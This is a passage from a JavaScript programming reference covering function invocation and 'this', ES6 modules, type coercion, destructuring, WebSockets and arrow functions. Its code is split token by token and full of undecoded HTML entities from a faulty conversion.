declared](http://stackoverflow.com/questions/41451181/does-let-override-a-global-declaration-and-throws-a-referenceerror):

y

=

7

;

*// &gt;&amp;quot;ReferenceError: &grave;y&grave; is not defined&quot;*

**let**

y

;

In non-strict-mode, assigning a value to a variable without any
declaration, automatically declares the variable in the global scope.
In this case, instead of y being automatically declared in the global
scope, **let** reserves the variable&apos;s name (y) and does not allow
any access or assignment to it before the line where it is
declared/initialized.

## Section 56.4: Apply and Call syntax and invocation

The apply and call methods in every function allow it to provide a
custom value for **this**.

**function**

print

(

)

{

console.

log

(

**this**

.

toPrint

)

;

}

print.

apply

(

{

toPrint

:

&quot;Foo&quot;

}

)

;

*// &gt;&amp;quot;Foo&quot;*

print.

call

(

{

toPrint

:

&quot;Foo&quot;

}

)

;

*// &gt;&amp;quot;Foo&quot;*

You might notice that the syntax for both the invocations used above
are the same. i.e. The signature looks similar.
>
But there is a small difference in their usage, since we are dealing
with functions and changing their scopes, we still need to maintain
the original arguments passed to the function. Both apply and call
support passing arguments to the target function as follows:

**function**

speak

(

)

{

**var**

sentences

=

Array

.

**prototype**

.

slice

.

call

(

arguments

)

;

console.

log

(

**this**

.

name

&plus;

&quot;: &quot;

&plus;

sentences

)

;

}

**var**

person

=

{

name

:

&quot;Sunny&quot;

}

;

speak.

apply

(

person

,

&lbrack;

&quot;I&quot;

,

&quot;Code&quot;

,

&quot;Startups&quot;

&rbrack;

)

;

*// &gt;&amp;quot;Sunny: I Code Startups&quot;*

speak.

call

(

person

,

&quot;I&quot;

,

&quot;&lt;3&quot;

,

&quot;Javascript&quot;

)

;

*// &gt;&amp;quot;Sunny: I &lt;3 Javascript&quot;*

Notice that apply allows you to pass an Array or the arguments object
(array-like) as the list of arguments, whereas, call needs you to pass
each argument separately.
>
These two methods give you the freedom to get as fancy as you want,
like implementing a poor version of the ECMAScript&apos;s native bind to
create a function that will always be called as a method of an object
from an original function.

**function**

bind

(

func

,

obj

)

{

**return**

**function**

(

)

{

**return**

func.

apply

(

obj

,

Array

.

**prototype**

.

slice

.

call

(

arguments

,

1

)

)

;

}

}

**var**

obj

=

{

name

:

&quot;Foo&quot;

}

;

**function**

print

(

)

{

console.

log

(

**this**

.

name

)

;

}

printObj

=

bind

(

print

,

obj

)

;

printObj

(

)

;

This will log

&quot;Foo&quot;

The bind function has a lot going on

1.  obj will be used as the value of **this**

2.  forward the arguments to the function

3.  and then return the value

## Section 56.5: Arrow function invocation

Version ≥ 6

When using arrow functions **this** takes the value from the enclosing
execution context&apos;s **this** (that is, **this** in arrow functions
has lexical scope rather than the usual dynamic scope). In global code
(code that doesn&apos;t belong to any function) it would be the global
object. And it keeps that way, even if you invoke the function
declared with the arrow notation from any of the others methods here
described.

**var**

globalThis

=

**this**

;

*//&quot;window&quot; in a browser, or &quot;global&quot; in Node.js*

**var**

foo

=

(

(

)

=&gt;

**this**

)

;

console.

log

(

foo

(

)

===

globalThis

)

;

*//true*

**var**

obj

=

{

name

:

&quot;Foo&quot;

}

;

console.

log

(

foo.

call

(

obj

)

===

globalThis

)

;

*//true*

See how **this** inherits the context rather than referring to the
object the method was called on.

**var**

globalThis

=

**this**

;

**var**

obj

=

{

withoutArrow

:

**function**

(

)

{

**return**

**this**

;

}

,

withArrow

:

(

)

=&gt;

**this**

}

;

console.

log

(

obj.

withoutArrow

(

)

===

obj

)

;

*//true*

console.

log

(

obj.

withArrow

(

)

===

globalThis

)

;

*//true*

**var**

fn

=

obj.

withoutArrow

;

*//no longer calling withoutArrow as a method*

**var**

fn2

=

obj.

withArrow

;

console.

log

(

fn

(

)

===

globalThis

)

;

*//true*

console.

log

(

fn2

(

)

===

globalThis

)

;

*//true*

## Section 56.6: Bound invocation

The bind method of every function allows you to create new version of
that function with the context strictly bound to a specific object. It
is especially useful to force a function to be called as a method of
an object.

**var**

obj

=

{

foo

:

&apos;bar&apos;

}

;

**function**

foo

(

)

{

**return**

**this**

.

foo

;

}

fooObj

=

foo.

bind

(

obj

)

;

fooObj

(

)

;

This will log:

bar

## Section 56.7: Method invocation

Invoking a function as a method of an object the value of **this**
will be that object.

**var**

obj

=

{

name

:

&quot;Foo&quot;

,

print

:

**function**

(

)

{

console.

log

(

**this**

.

name

)

}

}

We can now invoke print as a method of obj. **this** will be obj

obj.

print

(

)

;

This will thus log:

Foo

## Section 56.8: Anonymous invocation

Invoking a function as an anonymous function, **this** will be the
global object (self in the browser).

**function**

func

(

)

{

**return**

**this**

;

}

func

(

)

===

window

;

*// true*

Version = 5

In ECMAScript 5&apos;s strict mode, **this** will be **undefined** if the
function is invoked anonymously.

(

**function**

(

)

{

&quot;use strict&quot;

;

func

(

)

;

}

(

)

)

This will output
>
**undefined**

## Section 56.9: Constructor invocation

When a function is invoked as a constructor with the **new** keyword
**this** takes the value of the object being constructed

**function**

Obj

(

name

)

{

**this**

.

name

=

name

;

}

**var**

obj

=

**new**

Obj

(

&quot;Foo&quot;

)

;

console.

log

(

obj

)

;

This will log

{ name: &quot;Foo&quot; }

## Section 56.10: Using let in loops instead of var (click handlers example)

Let&apos;s say we need to add a button for each piece of loadedData array
(for instance, each button should be a slider showing the data; for
the sake of simplicity, we&apos;ll just alert a message). One may try
something like this:
>
**for**(**var** i = 0; i &lt; loadedData.length; i++)
jQuery(&quot;#container&quot;).append(&quot;&lt;a
class=&apos;button&apos;&gt;&quot;+loadedData&lbrack;i&rbrack;.label+&quot;&lt;/a&gt;&quot;)
>
.children().last() *// now let&apos;s attach a handler to the button which
is a child*
>
.on(&quot;click&quot;,**function**() { alert(loadedData&lbrack;i&rbrack;.content); });
>
But instead of alerting, each button will cause the

TypeError: loadedData&lbrack;i&rbrack; is undefined

  
  i ==
  

  

error. This is because the scope of i is the global scope (or a
function scope) and after the loop, 3. What we need is not to
&quot;remember the state of i&quot;. This can be done using **let**:
>
**for**(**let** i = 0; i &lt; loadedData.length; i++)
jQuery(&quot;#container&quot;).append(&quot;&lt;a
class=&apos;button&apos;&gt;&quot;+loadedData&lbrack;i&rbrack;.label+&quot;&lt;/a&gt;&quot;)
>
.children().last() *// now let&apos;s attach a handler to the button which
is a child*
>
.on(&quot;click&quot;,**function**() { alert(loadedData&lbrack;i&rbrack;.content); }); An
example of loadedData to be tested with this code:
>
**var** loadedData = &lbrack; { label:&quot;apple&quot;, content:&quot;green and round&quot;
},
>
{ label:&quot;blackberry&quot;, content:&quot;small black or blue&quot; },
>
{ label:&quot;pineapple&quot;, content:&quot;weird stuff.. difficult to explain
the shape&quot; } &rbrack;;
>
[A fiddle to illustrate this](https://jsfiddle.net/fvgqu7a2/2/)

# Chapter 57: Modules

## Section 57.1: Defining a module

In ECMAScript 6, when using the module syntax (import/export), each
file becomes its own module with a private namespace. Top-level
functions and variables do not pollute the global namespace. To expose
functions, classes, and variables for other modules to import, you can
use the export keyword.

*// not exported*

**function**

somethingPrivate

(

)

{

console.

log

(

&apos;TOP SECRET&apos;

)

}

export

**const**

PI

=

3.14

;

export

**function**

doSomething

(

)

{

console.

log

(

&apos;Hello from a module!&apos;

)

}

**function**

doSomethingElse

(

)

{

console.

log

(

&quot;Something else&quot;

)

}

export

{

doSomethingElse

}

export

class

MyClass

{

test

(

)

{

}

}

  
  **&lt;script**
  

  

Note: ES5 JavaScript files loaded via **&gt;** tags will remain the same
when not using import/export.
>
Only the values which are explicitly exported will be available
outside of the module. Everything else can be considered private or
inaccessible.

  
  my           &minus;    module.js
   - 

  

Importing this module would yield (assuming the previous code block is
in ):
>
import &ast; as myModule from &apos;./my-module.js&apos;;
>
myModule.PI; *// 3.14* myModule.doSomething(); *// &apos;Hello from a
module!&apos;* myModule.doSomethingElse(); *// &apos;Something else&apos;* **new**
myModule.MyClass(); *// an instance of MyClass*
>
myModule.somethingPrivate(); *// This would fail since
somethingPrivate was not exported*

## Section 57.2: Default exports

In addition to named imports, you can provide a default export.

*// circle.js*

export

**const**

PI

=

3.14

;

export

**default**

**function**

area

(

radius

)

{

**return**

PI

&ast;

radius

&ast;

radius

;

}

You can use a simplified syntax to import the default export.

import

circleArea from

&apos;./circle&apos;

;

console.

log

(

circleArea

(

4

)

)

;

Note that a *default export* is implicitly equivalent to a named
export with the name **default**, and the imported binding (circleArea
above) is simply an alias. The previous module can be written like

import

{

**default**

as circleArea

}

from

&apos;./circle&apos;

;

console.

log

(

circleArea

(

4

)

)

;

You can only have one default export per module. The name of the
default export can be omitted.

*// named export: must have a name*

export

**const**

PI

=

3.14

;

*// default export: name is not required*

export

**default**

**function**

(

radius

)

{

**return**

PI

&ast;

radius

&ast;

radius

;

}

## Section 57.3: Importing named members from another module

  
  test.js
  

  

Given that the module from the Defining a Module section exists in the
file , you can import from that module and use its exported members:

import

{

doSomething

,

MyClass

,

PI

}

from

&apos;./test&apos;

doSomething

(

)

**const**

mine

=

**new**

MyClass

(

)

mine.

test

(

)

console.

log

(

PI

)

  
  somethingPrivate
  

  

The () method was not exported from the test module, so attempting to
import it will fail:

import

{

somethingPrivate

}

from

&apos;./test&apos;

somethingPrivate

(

)

## Section 57.4: Importing an entire module

In addition to importing named members from a module or a module&apos;s
default export, you can also import all members into a namespace
binding.

import

&ast;

as test from

&apos;./test&apos;

test.

doSomething

(

)

All exported members are now available on the test variable.
Non-exported members are not available, just as they are not available
with named member imports.
>
**Note:** The path to the module &apos;./test&apos; is resolved by the
[*loader*](https://whatwg.github.io/loader/) and is not covered by the
ECMAScript specification - this could be a string to any resource (a
path - relative or absolute - on a filesystem, a URL to a network
resource, or any other string identifier).

## Section 57.5: Importing named members with aliases

Sometimes you may encounter members that have really long member
names, such as

  
  thisIsWayTooLongOfAName()
  

  

. In this case, you can import the member and give it a shorter name to
use in your

current module:

import

{

thisIsWayTooLongOfAName as shortName

}

from

&apos;module&apos;

shortName

(

)

You can import multiple long member names like this:

import

{

thisIsWayTooLongOfAName as shortName

,

thisIsAnotherLongNameThatShouldNotBeUsed as

otherName

}

from

&apos;module&apos;

shortName

(

)

console.

log

(

otherName

)

And finally, you can mix import aliases with the normal member import:

import

{

thisIsWayTooLongOfAName as shortName

,

PI

}

from

&apos;module&apos;

shortName

(

)

console.

log

(

PI

)

## Section 57.6: Importing with side eects

Sometimes you have a module that you only want to import so its
top-level code gets run. This is useful for polyfills, other globals,
or configuration that only runs once when your module is imported.

  
  test.js
  

  

Given a file named :

console.

log

(

&apos;Initializing&hellip;&apos;

)

You can use it like this:

import

&apos;./test&apos;

This example will print Initializing&hellip; to the console.

## Section 57.7: Exporting multiple named members

**const**

namedMember1

=

&hellip;

**const**

namedMember2

=

&hellip;

**const**

namedMember3

=

&hellip;

export

{

namedMember1

,

namedMember2

,

namedMember3

}

# Chapter 58: Screen

## Section 58.1: Getting the screen resolution

To get the physical size of the screen (including window chrome and
menubar/launcher):

**var**

width

=

window.

screen

.

width

,

height

=

window.

screen

.

height

;

## Section 58.2: Getting the "available" area of the screen

To get the "available" area of the screen (i.e. not including any bars
on the edges of the screen, but including window chrome and other
windows:

**var**

availableArea

=

{

pos

:

{

x

:

window.

screen

.

availLeft

,

y

:

window.

screen

.

availTop

}

,

size

:

{

width

:

window.

screen

.

availWidth

,

height

:

window.

screen

.

availHeight

}

}

;

## Section 58.3: Page width and height

To get current page width and height (for any browser), e.g. when
programming responsiveness:
>
**function** pageWidth() { **return** window.innerWidth != **null**?
window.innerWidth : document.documentElement &&
document.documentElement.clientWidth ?
document.documentElement.clientWidth : document.body != **null** ?
document.body.clientWidth : **null**; }
>
**function** pageHeight() { **return** window.innerHeight != **null**?
window.innerHeight : document.documentElement &&
document.documentElement.clientHeight ?
document.documentElement.clientHeight : document.body != **null**?
document.body.clientHeight : **null**; }

## Section 58.4: Window innerWidth and innerHeight Properties

Get the window height and width

**var**

width

=

window.

innerWidth

**var**

height

=

window.

innerHeight

## Section 58.5: Getting color information about the screen

To determine the color and pixel depths of the screen:

**var**

pixelDepth

=

window.

screen

.

pixelDepth

,

colorDepth

=

window.

screen

.

colorDepth

;

# Chapter 59: Variable coercion/conversion

## Section 59.1: Double Negation (!!x)

The double-negation !! is not a distinct JavaScript operator nor a
special syntax but rather just a sequence of two negations. It is used
to convert the value of any type to its appropriate **true** or
**false** Boolean value depending on whether it is *truthy* or
*falsy*.

!!

1

*// true*

!!

0

*// false*

!!

**undefined**

*// false*

!!

{

}

*// true*

!!

&lbrack;

&rbrack;

*// true*

The first negation converts any value to **false** if it is *truthy*
and to **true** if is *falsy*. The second negation then operates on a
normal Boolean value. Together they convert any *truthy* value to
**true** and any *falsy* value to **false**.
>
However, many professionals consider the practice of using such syntax
unacceptable and recommend simpler to read alternatives, even if
they&apos;re longer to write:
>
x !== 0 *// instead of !!x in case x is a number*
>
x != **null** *// instead of !!x in case x is an object, a string, or
an undefined*

  
  !!
  

  

Usage of x is considered poor practice due to the following reasons:

1.  Stylistically it may look like a distinct special syntax whereas in
    fact it is not doing anything other than two consecutive negations
    with implicit type conversion.

2.  It is better to provide information about types of values stored in
    variables and properties through the code.

  
  x !==     0 says that x is probably a number, whereas                !!
    

  

For example, x does not convey any such advantage to readers of the
code.

  
  Boolean
  

  

3.  Usage of (x) allows for similar functionality, and is a more
    explicit conversion of type.

## Section 59.2: Implicit conversion

JavaScript will try to automatically convert variables to more
appropriate types upon use. It&apos;s usually advised to do conversions
explicitly (see other examples), but it&apos;s still worth knowing what
conversions take place implicitly.
>
&quot;1&quot; + 5 === &quot;15&quot; *// 5 got converted to string.*
>
1 + &quot;5&quot; === &quot;15&quot; *// 1 got converted to string.* 1 - &quot;5&quot; === -4
*// &quot;5&quot; got converted to a number.* alert({}) *// alerts &quot;&lbrack;object
Object&rbrack;&quot;, {} got converted to string.*

!0 === **true** *// 0 got converted to boolean* **if** (&quot;hello&quot;) {}
*// runs, &quot;hello&quot; got converted to boolean.* **new** Array(3) ===
&quot;,,&quot;; *// Return true. The array is converted to string -
Array.toString();* Some of the trickier parts:

!&quot;0&quot; === **false** *// &quot;0&quot; got converted to true, then reversed.*
>
!&quot;false&quot; === **false** *// &quot;false&quot; converted to true, then
reversed.*

## Section 59.3: Converting to boolean

  -
  Boolean                                       (      &hellip;
  -  

  -

) will convert any data type into either **true** or **false**.

Boolean

(

&quot;true&quot;

)

===

**true**

Boolean

(

&quot;false&quot;

)

===

**true**

Boolean

(

&minus;

1

)

===

**true**

Boolean

(

1

)

===

**true**

Boolean

(

0

)

===

**false**

Boolean

(

&quot;&quot;

)

===

**false**

Boolean

(

&quot;1&quot;

)

===

**true**

Boolean

(

&quot;0&quot;

)

===

**true**

Boolean

(

{

}

)

===

**true**

Boolean

(

&lbrack;

&rbrack;

)

===

**true**

Empty strings and the number 0 will be converted to false, and all
others will be converted to true.
>
A shorter, but less clear, form:

!!

&quot;true&quot;

===

**true**

!!

&quot;false&quot;

===

**true**

!!-

1

===

**true**

!!

1

===

**true**

!!

0

===

**false**

!!

&quot;&quot;

===

**false**

!!

&quot;1&quot;

===

**true**

!!

&quot;0&quot;

===

**true**

!!

{

}

===

**true**

!!

&lbrack;

&rbrack;

===

**true**

This shorter form takes advantage of implicit type conversion using
the logical NOT operator twice, as described in
http://stackoverflow.com/documentation/javascript/208/boolean-logic/3047/double-negation-x
>
Here is the complete list of boolean conversions from the [ECMAScript
specification](http://www.ecma-international.org/publications/files/ECMA-ST/Ecma-262.pdf)

  
  Boolean              (   myArg          )   === **false**
      

  

  
  Boolean              (   myArg          )   === myArg
      

  

  
  Boolean              (   myArg          )   === **false**
      

  

  
  Boolean              (   myArg          )   === **false**
      

  

  
  Boolean               (   myArg           )   === **true**
      

  

if myArg of type **undefined** or **null** then if myArg of type
boolean then
>
if myArg of type number then if myArg is +0, ‑0, or **NaN**; otherwise
**true** if myArg of type string then if myArg is the empty String
(its length is zero); otherwise **true**
>
if myArg of type symbol or object then
>
Values that get converted to **false** as booleans are called *falsy*
(and all others are called *truthy*). See Comparison Operations.

## Section 59.4: Converting a string to a number

Number

(

&apos;0&apos;

)

===

0

  -
  Number                                     (       &apos;0&apos;
  - - 

  -

) will convert the string (&apos;0&apos;) into a number (0)
>
A shorter, but less clear, form:

&plus;

&apos;0&apos;

===

0

The unary + operator does nothing to numbers, but converts anything
else to a number.

  -
  12           )      ===                              &minus;     12
    -  

  -

Interestingly, +(-.

parseInt

(

&apos;0&apos;

,

10

)

===

0

  
  parseInt                            (    &apos;0&apos;         ,    10
    -  -

  

) will convert the string (&apos;0&apos;) into a number (0), don&apos;t forget the
second argument, which is radix.

If not given, parseInt could convert string to wrong number.

## Section 59.5: Converting a number to a string

String

(

0

)

===

&apos;0&apos;

  
  String
  

  

&lpar;0&rpar; will convert the number (0) into a string (&apos;0&apos;).
>
A shorter, but less clear, form:

&apos;&apos;

&plus;

0

===

&apos;0&apos;

## Section 59.6: Primitive to Primitive conversion table

  
  **Value Converted                                        
  To String                                                
  Converted To                                             
  Number Converted                                         
  To Boolean**                                             
   -  -
  undefinded                           NaN                 false
  &quot;undefined&quot;                                            

  null &quot;null&quot;                        0                   false

  true &quot;true&quot;                        1                   

  false &quot;false&quot;                      0                   

  NaN &quot;NaN&quot;                                              **false**

  &quot;&quot; empty string                    0                   **false**

  &quot; &quot;                                0                   **true**

  &quot;2.4&quot; (numeric)                    2.4                 true

  &quot;test&quot; (non                        NaN                 true
  numeric                                                  

  &quot;0&quot;                                0                   **true**

  &quot;1&quot;                                1                   true

  -0                &quot;0&quot;                                  **false**

  0                 &quot;0&quot;                                  false

  1                 &quot;1&quot;                                  true

  Infinity          &quot;Infinity&quot;                           true

  -Infinity         &quot;-Infinity&quot;                          true

  &lbrack;&rbrack;              &quot;&quot;               0                   true

  &lbrack;3&rbrack;             &quot;3&quot;              3                   true

  &lbrack;&apos;a&apos;&rbrack;         &quot;a&quot;              NaN                 true

  &lbrack;&apos;a&apos;,&apos;b&apos;&rbrack;   &quot;a,b&quot;            NaN                 true

  { }               &quot;&lbrack;object         NaN                 true
                    Object&rbrack;&quot;                             

  function(){}      &quot;function(){}&quot;   NaN                 true
  

Bold values highlight conversion that programmers may find surprising
>
To convert explicitly values you can use String() Number() Boolean()

## Section 59.7: Convert an array to a string

  -
  Array             .   join           (   separator
      

  -

) can be used to output an array as a string, with a configurable
separator.
>
Default (separator = &quot;,&quot;):

&lbrack;

&quot;a&quot;

,

&quot;b&quot;

,

&quot;c&quot;

&rbrack;

.

join

(

)

===

&quot;a,b,c&quot;

With a string separator:

&lbrack;

1

,

2

,

3

,

4

&rbrack;

.

join

(

&quot; + &quot;

)

===

&quot;1 + 2 + 3 + 4&quot;

With a blank separator:

&lbrack;

&quot;B&quot;

,

&quot;o&quot;

,

&quot;b&quot;

&rbrack;

.

join

(

&quot;&quot;

)

===

&quot;Bob&quot;

## Section 59.8: Array to String using array methods

This way may seem to be useless because you are using anonymous
function to accomplish something that you can do it with join(); But
if you need to make something to the strings while you are converting
the Array to String, this can be useful.

**var**

arr

=

&lbrack;

&apos;a&apos;

,

&apos;

á

&apos;

,

&apos;b&apos;

,

&apos;c&apos;

&rbrack;

**function**

upper_lower

(

a

,

b

,

i

)

{

*//&hellip;do something here*

b

=

i

&

1

?

b&period;

toUpperCase

(

)

:

b&period;

toLowerCase

(

)

;

**return**

a

&plus;

&apos;,&apos;

&plus;

b

}

arr

=

arr.

reduce

(

upper_lower

)

;

*// &quot;a,*

Á

*,b,C&quot;*

## Section 59.9: Converting a number to a boolean

Boolean

(

0

)

===

**false**

  
  Boolean(
  

  

0&rpar; will convert the number 0 into a boolean **false**.
>
A shorter, but less clear, form:

!!

0

===

**false**

## Section 59.10: Converting a string to a boolean

To convert a string to boolean use

Boolean

(

myString

)

or the shorter but less clear form

!!

myString

All strings except the empty string (of length zero) are evaluated to
**true** as booleans.

Boolean

(

&apos;&apos;

)

===

**false**

*// is true*

Boolean

(

&quot;&quot;

)

===

**false**

*// is true*

Boolean

(

&apos;0&apos;

)

===

**false**

*// is false*

Boolean

(

&apos;any_nonempty_string&apos;

)

===

**true**

*// is true*

## Section 59.11: Integer to Float

In JavaScript, all numbers are internally represented as floats. This
means that simply using your integer as a float is all that must be
done to convert it.

## Section 59.12: Float to Integer

To convert a float to an integer, JavaScript provides multiple
methods.
>
The floor function returns the first integer less than or equal to the
float.

Math

.

floor

(

5.7

)

;

*// 5*

The ceil function returns the first integer greater than or equal to
the float.

Math

.

ceil

(

5.3

)

;

*// 6*

The round function rounds the float.

Math

.

round

(

3.2

)

;

*// 3*

Math

.

round

(

3.6

)

;

*// 4*

Version

≥

6

Truncation (trunc) removes the decimals from the float.

Math

.

trunc

(

3.7

)

;

*// 3*

Notice the difference between truncation (trunc) and floor:

Math

.

floor

(

&minus;

3.1

)

;

*// -4*

Math

.

trunc

(

&minus;

3.1

)

;

*// -3*

## Section 59.13: Convert string to float

parseFloat accepts a string as an argument which it converts to a
float/

parseFloat

(

&quot;10.01&quot;

)

*// = 10.01*

# Chapter 60: Destructuring assignment

Destructuring is a **pattern matching** technique that is added to
JavaScript recently in ECMAScript 6.
>
It allows you to bind a group of variables to a corresponding set of
values when their pattern matches to the right hand-side and the left
hand-side of the expression.

## Section 60.1: Destructuring Objects

Destructuring is a convenient way to extract properties from objects
into variables.
>
Basic syntax:

**let**

person

=

{

name

:

&apos;Bob&apos;

,

age

:

25

}

;

**let**

{

name

,

age

}

=

person

;

*// Is equivalent to*

**let**

name

=

person.

name

;

*// &apos;Bob&apos;*

**let**

age

=

person.

age

;

*// 25*

Destructuring and renaming:

**let**

person

=

{

name

:

&apos;Bob&apos;

,

age

:

25

}

;

**let**

{

name

:

firstName

}

=

person

;

*// Is equivalent to*

**let**

firstName

=

person.

name

;

*// &apos;Bob&apos;*

Destructuring with default values:

**let**

person

=

{

name

:

&apos;Bob&apos;

,

age

:

25

}

;

**let**

{

phone

=

&apos;123-456-789&apos;

}

=

person

;

*// Is equivalent to*

**let**

phone

=

person.

hasOwnProperty

(

&apos;phone&apos;

)

?

person.

phone

:

&apos;123-456-789&apos;

;

*// &apos;123-456-789&apos;*

Destructuring and renaming with default values

**let**

person

=

{

name

:

&apos;Bob&apos;

,

age

:

25

}

;

**let**

{

phone

:

p

=

&apos;123-456-789&apos;

}

=

person

;

*// Is equivalent to*
>
**let** p = person.hasOwnProperty(&apos;phone&apos;) ? person.phone :
&apos;123-456-789&apos;; *// &apos;123-456-789&apos;*

## Section 60.2: Destructuring function arguments

Pull properties from an object passed into a function. This pattern
simulates named parameters instead of relying on argument position.

**let**

user

=

{

name

:

&apos;Jill&apos;

,

age

:

33

,

profession

:

&apos;Pilot&apos;

}

**function**

greeting

(

{

name

,

profession

}

)

{

console.

log

(

&grave;Hello

,

&dollar;

{

name

}

the &dollar;

{

profession

}

&grave;

)

}

greeting

(

user

)

This also works for arrays:

**let**

parts

=

&lbrack;

&quot;Hello&quot;

,

&quot;World!&quot;

&rbrack;

;

**function**

greeting

(

&lbrack;

first

,

second

&rbrack;

)

{

console.

log

(

&grave;&dollar;

{

first

}

&dollar;

{

second

}

&grave;

)

;

}

## Section 60.3: Nested Destructuring

We are not limited to destructuring an object/array, we can
destructure a nested object/array.

***Nested Object Destructuring***

**var**

obj

=

{

a

:

{

c

:

1

,

d

:

3

}

,

b

:

2

}

;

**var**

{

a

:

{

c

:

x

,

d

:

y

}

,

b

:

z

}

=

obj

;

console.

log

(

x

,

y

,

z

)

;

*// 1,3,2*

***Nested Array Destructuring***

**var**

arr

=

&lbrack;

1

,

2

,

&lbrack;

3

,

4

&rbrack;

,

5

&rbrack;

;

**var**

&lbrack;

a

,

,

&lbrack;

b

,

c

&rbrack;

,

d

&rbrack;

=

arr

;

console.

log

(

a

,

b

,

c

,

d

)

;

*// 1 3 4 5*

Destructuring is not just limited to a single pattern, we can have
arrays in it, with n-levels of nesting. Similarly we can destructure
arrays with objects and vice-versa.

***Arrays Within Object***

**var**

obj

=

{

a

:

1

,

b

:

&lbrack;

2

,

3

&rbrack;

}

;

**var**

{

a

:

x1

,

b

:

&lbrack;

x2

,

x3

&rbrack;

}

=

obj

;

console.

log

(

x1

,

x2

,

x3

)

;

*// 1 2 3*

***Objects Within Arrays***

**var**

arr

=

&lbrack;

1

,

2

,

{

a

:

3

}

,

4

&rbrack;

;

**var**

&lbrack;

x1

,

x2

,

{

a

:

x3

}

,

x4

&rbrack;

=

arr

;

console.

log

(

x1

,

x2

,

x3

,

x4

)

;

## Section 60.4: Destructuring Arrays

**const**

myArr

=

&lbrack;

&apos;one&apos;

,

&apos;two&apos;

,

&apos;three&apos;

&rbrack;

**const**

&lbrack;

a

,

b

,

c

&rbrack;

=

myArr

*// a = &apos;one&apos;, b = &apos;two, c = &apos;three&apos;*

We can set default value in destructuring array, see the example of
Default Value While Destructuring.
>
With destructuring array, we can swap the values of 2 variables
easily:

**var**

a

=

1

;

**var**

b

=

3

;

&lbrack;

a

,

b

&rbrack;

=

&lbrack;

b

,

a

&rbrack;

;

*// a = 3, b = 1*

We can specify empty slots to skip unneeded values:

&lbrack;

a

,

,

b

&rbrack;

=

&lbrack;

1

,

2

,

3

&rbrack;

*// a = 1, b = 3*

## Section 60.5: Destructuring inside variables

Aside from destructuring objects into function arguments, you can use
them inside variable declarations as follows:

**const**

person

=

{

name

:

&apos;John Doe&apos;

,

age

:

45

,

location

:

&apos;Paris, France&apos;

,

}

;

**let** { name, age, location } = person;
>
console.log(&apos;I am &apos; + name + &apos;, aged &apos; + age + &apos; and living in
&apos; + location + &apos;.&apos;);
>
*// -&amp;quot;I am John Doe aged 45 and living in Paris, France.&quot;*
>
As you can see, three new variables were created: name, age and
location and their values were grabbed from the object person if they
matched key names.

## Section 60.6: Default Value While Destructuring

We often encounter a situation where a property we&apos;re trying to
extract doesn&apos;t exist in the object/array, resulting in a TypeError
(while destructuring nested objects) or being set to **undefined**.
While destructuring we can set a default value, which it will fallback
to, in case of it not being found in the object.

**var**

obj

=

{

a

:

1

}

;

**var**

{

a

:

x

,

b

:

x1

=

10

}

=

obj

;

console.

log

(

x

,

x1

)

;

*// 1, 10*

**var**

arr

=

&lbrack;

&rbrack;

;

**var**

&lbrack;

a

=

5

,

b

=

10

,

c

&rbrack;

=

arr

;

console.

log

(

a

,

b

,

c

)

;

*// 5, 10, undefined*

## Section 60.7: Renaming Variables While Destructuring

Destructuring allows us to refer to one key in an object, but declare
it as a variable with a different name. The syntax looks like the
key-value syntax for a normal JavaScript object.

**let**

user

=

{

name

:

&apos;John Smith&apos;

,

id

:

10

,

email

:

&apos;johns@workcorp.com&apos;

,

}

;

**let**

{

user

:

userName

,

id

:

userId

}

=

user

;

console.

log

(

userName

)

*// John Smith*

console.

log

(

userId

)

*// 10*

# Chapter 61: WebSockets

**Parameter Details**

url The server url supporting this web socket connection. data The
content to send to the host. message The message received from the
host.
>
WebSocket is protocol, which enables two-way communication between a
client and server:
>
The goal WebSocket is to provide a mechanism for browser-based
applications that need two-way communication with servers that does
not rely on opening multiple HTTP connections. ([RFC
6455](https://tools.ietf.org/html/rfc6455))
>
WebSocket works over HTTP protocol.

## Section 61.1: Working with string messages

**var**

wsHost

=

&quot;ws://my-sites-url.com/path/to/echo-web-socket-handler&quot;

;

**var**

ws

=

**new**

WebSocket

(

wsHost

)

;

**var**

value

=

&quot;an example message&quot;

;

*//onmessage : Event Listener - Triggered when we receive message form
server*

ws.

onmessage

=

**function**

(

message

)

{

**if**

(

message

===

value

)

{

console.

log

(

&quot;The echo host sent the correct message.&quot;

)

;

}

**else**

{

console.

log

(

&quot;Expected: &quot;

&plus;

value

)

;

console.

log

(

&quot;Received: &quot;

&plus;

message

)

;

}

}

;

*//onopen : Event Listener - event is triggered when websockets
readyState changes to open which means*

*now we are ready to send and receives messages from server*

ws.

onopen

=

**function**

(

)

{

*//send is used to send the message to server*

ws.

send

(

value

)

;

}

;

## Section 61.2: Establish a web socket connection

**var**

wsHost

=

&quot;ws://my-sites-url.com/path/to/web-socket-handler&quot;

;

**var**

ws

=

**new**

WebSocket

(

wsHost

)

;

## Section 61.3: Working with binary messages

**var**

wsHost

=

&quot;http://my-sites-url.com/path/to/echo-web-socket-handler&quot;

;

**var**

ws

=

**new**

WebSocket

(

wsHost

)

;

**var**

buffer

=

**new**

ArrayBuffer

(

5

)

;

*// 5 byte buffer*

**var**

bufferView

=

**new**

DataView

(

buffer

)

;

bufferView.

setFloat32

(

0

,

Math

.

PI

)

;

bufferView.

setUint8

(

4

,

127

)

;

ws.

binaryType

=

&apos;arraybuffer&apos;

;

ws.

onmessage

=

**function**

(

message

)

{

**var**

view

=

**new**

DataView

(

message.

data

)

;

console.

log

(

&apos;Uint8:&apos;

,

view.

getUint8

(

4

)

,

&apos;Float32:&apos;

,

view.

getFloat32

(

0

)

)

}

;

ws.

onopen

=

**function**

(

)

{

ws.

send

(

buffer

)

;

}

;

## Section 61.4: Making a secure web socket connection

**var**

sck

=

&quot;wss://site.com/wss-handler&quot;

;

**var**

wss

=

**new**

WebSocket

(

sck

)

;

This uses the wss instead of ws to make a secure web socket connection
which make use of HTTPS instead of HTTP

# Chapter 62: Arrow Functions

Arrow functions are a concise way of writing anonymous, lexically
scoped functions in [ECMAScript 2015
(ES6)](https://developer.mozilla.org/en-US/docs/Web/JavaScript/New_in_JavaScript/ECMAScript_2015_support_in_Mozilla).

## Section 62.1: Introduction

In JavaScript, functions may be anonymously defined using the
&quot;arrow&quot; (=&gt;) syntax, which is sometimes referred to as a *lambda
expression* due to Common Lisp similarities.
>
The simplest form of an arrow function has its arguments on the left
side of =&bsol;and the return value on the right side:

item

=&gt;

item

&plus;

1

*// -&bsol;function(item){return item + 1}*

This function can be immediately invoked by providing an argument to
the expression:

(

item

=&gt;

item

&plus;

1

)

(

41

)

*// -&bsol;42*

If an arrow function takes a single parameter, the parentheses around
that parameter are optional. For example, the following expressions
